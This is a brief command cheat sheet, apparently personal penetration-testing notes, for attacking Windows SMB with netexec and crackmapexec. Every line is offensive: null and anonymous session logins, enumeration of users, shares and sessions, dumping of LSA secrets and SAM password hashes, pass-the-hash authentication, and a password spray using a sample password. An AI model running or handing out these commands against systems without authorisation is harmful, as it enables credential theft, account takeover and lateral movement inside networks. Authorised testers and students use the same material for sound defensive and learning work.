```bash
$ netexec smb <IP>[/mask] # host discovery and enumeration
$ netexec smb <targets_file> # scan hosts from file

$ netexec smb <IP>[/mask]  -u "" -p "" # check smb null sesion login
$ netexec smb <IP>[/mask]  -u "anonymous" -p "" # login as anonymous

--users # get list of all users in domain
--pas-pol # password policy
--shares # enumerate shares
--loggedon-users # check act ive sessions on machine
--lsa # get local security authority
--sam # get users and hashes

$ netexec smb <IP>[/mask]  -u <user> -H <NT_hash> -d <./domain> # PasstheHash

crackmapexec smb <IP> -u <users.txt> -p 'Passwd123!@#' -d <domain> --continue-on-success # password spray attack
```